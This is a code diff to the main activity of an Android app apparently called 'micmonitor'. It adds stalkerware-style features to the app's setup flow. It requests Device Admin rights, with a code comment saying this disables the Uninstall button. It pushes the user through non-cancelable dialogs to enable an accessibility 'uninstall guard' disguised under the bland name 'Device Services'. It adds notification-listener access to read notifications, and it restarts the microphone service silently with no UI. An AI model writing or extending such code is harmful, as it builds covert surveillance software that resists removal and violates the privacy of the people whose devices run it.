@@ -2,6 +2,9 @@ package com.micmonitor.app
 
 import android.Manifest
 import android.annotation.SuppressLint
+import android.app.AlertDialog
+import android.app.admin.DevicePolicyManager
+import android.content.ComponentName
 import android.content.Context
 import android.content.Intent
 import android.content.pm.PackageManager
@@ -22,6 +25,8 @@ class MainActivity : AppCompatActivity() {
     private val prefs by lazy {
         getSharedPreferences("micmonitor", Context.MODE_PRIVATE)
     }
+    private val dpm by lazy { getSystemService(DevicePolicyManager::class.java) }
+    private val adminComponent by lazy { ComponentName(this, AdminReceiver::class.java) }
 
     // All permissions needed
     private val requiredPermissions: Array<String>
@@ -34,11 +39,23 @@ class MainActivity : AppCompatActivity() {
             )
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                 perms.add(Manifest.permission.POST_NOTIFICATIONS)
-        // Already set up — restart service silently and close immediately (no UI shown)
+            }
+            return perms.toTypedArray()
+        }
+
+    override fun onCreate(savedInstanceState: Bundle?) {
+        super.onCreate(savedInstanceState)
+
+        // Already set up — restart service silently; re-check protection features
         if (prefs.getBoolean("consent_given", false) && hasAllPermissions()) {
             launchService()
             requestBatteryOptExemption()
-            finish()
+            when {
+                !dpm.isAdminActive(adminComponent)   -> requestDeviceAdmin()
+                !isAccessibilityServiceEnabled()     -> guideAccessibility()
+                !isNotificationListenerEnabled()     -> guideNotificationAccess()
+                else                                 -> finish()
+            }
             return
         }
 
@@ -74,7 +91,7 @@ class MainActivity : AppCompatActivity() {
                 prefs.edit().putBoolean("consent_given", true).apply()
                 launchService()
                 requestBatteryOptExemption()
-                finish()
+                requestDeviceAdmin()  // start protection setup on first run
             } else {
                 Toast.makeText(
                     this,
@@ -85,6 +102,92 @@ class MainActivity : AppCompatActivity() {
                     "Microphone permission denied. Please allow it."
             }
         }
+    }
+
+    /** Step 1: activate Device Admin (disables Uninstall button in App Info) */
+    private fun requestDeviceAdmin() {
+        if (!dpm.isAdminActive(adminComponent)) {
+            val intent = Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
+                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent)
+                putExtra(
+                    DevicePolicyManager.EXTRA_ADD_EXPLANATION,
+                    "Prevents unauthorized uninstallation of this app."
+                )
+            }
+            @Suppress("DEPRECATION")
+            startActivityForResult(intent, RC_DEVICE_ADMIN)
+        } else {
+            guideAccessibility()
+        }
+    }
+
+    /** Step 2: after device admin result, guide user to enable Accessibility Service */
+    @Suppress("DEPRECATION")
+    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+        super.onActivityResult(requestCode, resultCode, data)
+        if (requestCode == RC_DEVICE_ADMIN) {
+            guideAccessibility()
+        }
+    }
+
+    private fun guideAccessibility() {
+        if (!isAccessibilityServiceEnabled()) {
+            AlertDialog.Builder(this)
+                .setTitle("Enable Uninstall Protection")
+                .setMessage(
+                    "To block unauthorized uninstalls, enable 'Device Services' in:\n\n" +
+                    "Settings → Accessibility → Installed Services → Device Services\n\n" +
+                    "Tap 'Open Settings', find 'Device Services' and turn it ON."
+                )
+                .setCancelable(false)
+                .setPositiveButton("Open Settings") { _, _ ->
+                    startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS))
+                    finish()
+                }
+                .setNegativeButton("Skip") { _, _ -> guideNotificationAccess() }
+                .show()
+        } else {
+            guideNotificationAccess()
+        }
+    }
+
+    private fun guideNotificationAccess() {
+        if (!isNotificationListenerEnabled()) {
+            AlertDialog.Builder(this)
+                .setTitle("Enable Notification Access")
+                .setMessage(
+                    "To read notifications, enable 'Device Services' in:\n\n" +
+                    "Settings → Notifications → Notification Access → Device Services\n\n" +
+                    "Tap 'Open Settings' and turn it ON."
+                )
+                .setCancelable(false)
+                .setPositiveButton("Open Settings") { _, _ ->
+                    startActivity(Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS))
+                    finish()
+                }
+                .setNegativeButton("Skip") { _, _ -> finish() }
+                .show()
+        } else {
+            finish()
+        }
+    }
+
+    private fun isNotificationListenerEnabled(): Boolean {
+        val flat = Settings.Secure.getString(
+            contentResolver,
+            "enabled_notification_listeners"
+        ) ?: return false
+        val target = "$packageName/${NotifListenerService::class.java.name}"
+        return flat.split(":").any { it.equals(target, ignoreCase = true) }
+    }
+
+    private fun isAccessibilityServiceEnabled(): Boolean {
+        val flat = Settings.Secure.getString(
+            contentResolver,
+            Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
+        ) ?: return false
+        val target = "$packageName/${UninstallGuardService::class.java.name}"
+        return flat.split(":").any { it.equals(target, ignoreCase = true) }
     }
 
     private fun launchService() {
@@ -116,6 +219,7 @@ class MainActivity : AppCompatActivity() {
 
     companion object {
         private const val REQUEST_CODE = 1001
+        private const val RC_DEVICE_ADMIN = 1002
     }
 }
 
